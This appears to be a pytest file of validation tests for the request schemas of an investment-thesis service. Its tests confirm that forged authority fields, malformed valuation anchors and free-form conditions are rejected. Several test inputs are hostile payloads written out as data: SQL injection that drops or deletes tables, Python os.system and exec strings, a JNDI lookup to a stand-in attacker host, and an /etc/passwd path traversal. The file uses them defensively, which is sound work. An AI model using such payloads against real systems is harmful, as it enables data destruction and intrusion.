"""Strict RED contracts for thesis request DTOs and the restricted condition AST."""
from __future__ import annotations

from datetime import date

import pytest
from pydantic import ValidationError


def _anchor(**overrides: object) -> dict[str, object]:
    value: dict[str, object] = {
        "method": "discounted_cash_flow",
        "currency": "CNY",
        "as_of": date(2026, 6, 30),
        "low": 1420.0,
        "high": 1680.0,
        "assumptions": [
            {"name": "terminal_growth", "value": 0.03, "unit": "ratio"},
            {"name": "discount_rate", "value": 0.085, "unit": "ratio"},
        ],
        "limitations": ["Sensitive to terminal growth and discount-rate estimates."],
    }
    value.update(overrides)
    return value


def _condition(**overrides: object) -> dict[str, object]:
    value: dict[str, object] = {
        "source_kind": "financial",
        "field": "revenue_growth_yoy",
        "operator": "lt",
        "threshold": 0.0,
        "unit": "ratio",
        "lookback_days": 120,
        "cadence": "quarterly",
        "timezone": "Asia/Shanghai",
        "description": "Revenue growth turns negative.",
    }
    value.update(overrides)
    return value


def _version(**overrides: object) -> dict[str, object]:
    value: dict[str, object] = {
        "instrument": "600519.SH",
        "core_judgment": "Durable pricing power supports long-run cash generation.",
        "rationale": "Distribution depth and brand economics remain observable in filings.",
        "change_reason": "Initial thesis record",
        "anchors": [_anchor()],
        "conditions": [_condition()],
    }
    value.update(overrides)
    return value


def test_version_draft_requires_complete_anchor_and_condition() -> None:
    from app.theses.schemas import ThesisVersionRequest

    request = ThesisVersionRequest.model_validate(_version())

    assert request.instrument == "600519.SH"
    assert request.anchors[0].low == 1420.0
    assert request.anchors[0].high == 1680.0
    assert request.anchors[0].assumptions[0].name == "terminal_growth"
    assert request.conditions[0].cadence == "quarterly"
    assert request.conditions[0].timezone == "Asia/Shanghai"


def test_strict_version_draft_rejects_browser_authority_fields() -> None:
    from app.theses.schemas import ThesisVersionRequest

    forbidden = {
        "official_state": "invalidated",
        "reviewer_principal": "browser-admin",
        "evidence_fingerprint": "0" * 64,
        "evidence_result": "matched",
        "created_by": "browser-user",
        "version": 99,
        "predecessor_id": "browser-selected",
    }
    for field, value in forbidden.items():
        with pytest.raises(ValidationError):
            ThesisVersionRequest.model_validate(_version(**{field: value}))


def test_valuation_anchor_rejects_target_or_ai_link_substitutes() -> None:
    from app.theses.schemas import ValuationAnchor

    invalid = (
        {"target_price": 1600.0},
        {"ai_report_url": "https://example.invalid/report/1"},
        {"method": "dcf", "currency": "CNY", "as_of": "2026-06-30", "target_price": 1600.0},
    )
    for payload in invalid:
        with pytest.raises(ValidationError):
            ValuationAnchor.model_validate(payload)


def test_valuation_anchor_rejects_nonfinite_inverted_and_empty_assumptions() -> None:
    from app.theses.schemas import ValuationAnchor

    invalid = (
        _anchor(low=float("nan")),
        _anchor(high=float("inf")),
        _anchor(low=1700.0, high=1600.0),
        _anchor(assumptions=[]),
        _anchor(assumptions=[{"name": "", "value": 1.0, "unit": "ratio"}]),
        _anchor(limitations=[]),
    )
    for payload in invalid:
        with pytest.raises(ValidationError):
            ValuationAnchor.model_validate(payload)


def test_condition_ast_accepts_only_fixed_source_field_operator_shape() -> None:
    from app.theses.schemas import ThesisCondition

    accepted = (
        _condition(source_kind="market", field="close", operator="lt", unit="CNY", cadence="daily"),
        _condition(source_kind="financial", field="revenue_growth_yoy", operator="lt", unit="ratio", cadence="quarterly"),
        _condition(source_kind="analysis", field="report_score", operator="lte", unit="score", cadence="weekly"),
    )
    for payload in accepted:
        condition = ThesisCondition.model_validate(payload)
        assert condition.source_kind in {"market", "financial", "analysis"}
        assert condition.operator in {"lt", "lte", "gt", "gte", "eq", "between"}


def test_condition_ast_rejects_unknown_source_field_operator_and_oversized_lookback() -> None:
    from app.theses.schemas import ThesisCondition

    invalid = (
        _condition(source_kind="browser"),
        _condition(field="password_hash"),
        _condition(operator="eval"),
        _condition(operator="between", threshold=1.0),
        _condition(lookback_days=3661),
        _condition(cadence="global"),
        _condition(timezone="../../etc/passwd"),
    )
    for payload in invalid:
        with pytest.raises(ValidationError):
            ThesisCondition.model_validate(payload)


def test_condition_ast_rejects_free_form_sql_python_and_identifier_injection() -> None:
    from app.theses.schemas import ThesisCondition

    hostile = (
        _condition(field="close); DROP TABLE thesis_versions; --"),
        _condition(operator="__import__('os').system"),
        _condition(threshold="SELECT secret FROM sessions"),
        _condition(threshold="lambda row: row['close'] < 1"),
        _condition(description="${jndi:ldap://attacker.invalid/x}"),
        {**_condition(), "expression": "close < 1"},
        {**_condition(), "sql": "1=1; DELETE FROM thesis_conditions"},
        {**_condition(), "python": "exec(payload)"},
    )
    for payload in hostile:
        with pytest.raises(ValidationError):
            ThesisCondition.model_validate(payload)


def test_revision_body_requires_expected_predecessor_and_explicit_change_reason() -> None:
    from app.theses.schemas import ThesisRevisionRequest

    valid = ThesisRevisionRequest.model_validate(
        {
            "expected_predecessor_id": "version-1",
            "change_reason": "Quarterly filing changed the margin assumption.",
            "rationale": "Updated audited evidence is now available.",
        }
    )
    assert valid.expected_predecessor_id == "version-1"
    for payload in (
        {"change_reason": "missing predecessor"},
        {"expected_predecessor_id": "version-1", "change_reason": ""},
        {"expected_predecessor_id": "version-1", "change_reason": "valid", "instrument": "000001.SZ"},
        {"expected_predecessor_id": "version-1", "change_reason": "valid", "official_state": "invalidated"},
    ):
        with pytest.raises(ValidationError):
            ThesisRevisionRequest.model_validate(payload)


def test_review_body_contains_only_pending_id_and_rationale() -> None:
    from app.theses.schemas import ReviewDecisionRequest

    request = ReviewDecisionRequest.model_validate(
        {"pending_id": "pending-opaque", "rationale": "Reviewed the exact frozen evidence."}
    )
    assert request.model_dump() == {
        "pending_id": "pending-opaque",
        "rationale": "Reviewed the exact frozen evidence.",
    }
    for field in ("principal", "reviewer_principal", "official_state", "evidence", "evidence_fingerprint", "decision"):
        with pytest.raises(ValidationError):
            ReviewDecisionRequest.model_validate(
                {"pending_id": "pending-opaque", "rationale": "Reviewed evidence.", field: "browser-controlled"}
            )


def test_check_result_enum_preserves_missing_evidence_and_safe_error_states() -> None:
    from app.theses.schemas import ConditionCheckResult

    assert ConditionCheckResult("matched").value == "matched"
    assert ConditionCheckResult("not_matched").value == "not_matched"
    assert ConditionCheckResult("insufficient_evidence").value == "insufficient_evidence"
    assert ConditionCheckResult("error").value == "error"
    for value in ("false", "missing_as_zero", "confirmed", "invalidated"):
        with pytest.raises(ValueError):
            ConditionCheckResult(value)
